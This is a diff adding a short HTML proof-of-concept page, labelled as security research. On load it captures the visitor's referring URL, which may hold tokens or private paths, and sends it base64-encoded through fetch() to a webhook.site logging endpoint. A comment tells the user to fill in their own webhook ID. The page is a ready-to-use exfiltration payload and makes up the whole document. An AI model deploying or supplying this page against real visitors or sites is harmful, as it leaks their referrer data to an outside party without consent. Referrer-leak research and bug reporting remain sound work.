@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Research - PoC</title>
+</head>
+<body>
+    <script>
+        // Extract the Referer (where the victim came from)
+        var leakedReferer = document.referrer;
+        
+        if (leakedReferer) {
+            // Send the leak to a public logger (like Webhook.site) 
+            // Replace 'YOUR_WEBHOOK_URL' with your actual Webhook.site link
+            fetch('https://webhook.site/YOUR_UNIQUE_ID?leak=' + btoa(leakedReferer));
+            
+            document.write("<h1>PoC Triggered</h1><p>Referer logged successfully.</p>");
+        } else {
+            document.write("<h1>PoC Ready</h1><p>Waiting for redirect...</p>");
+        }
+    </script>
+</body>
+</html>
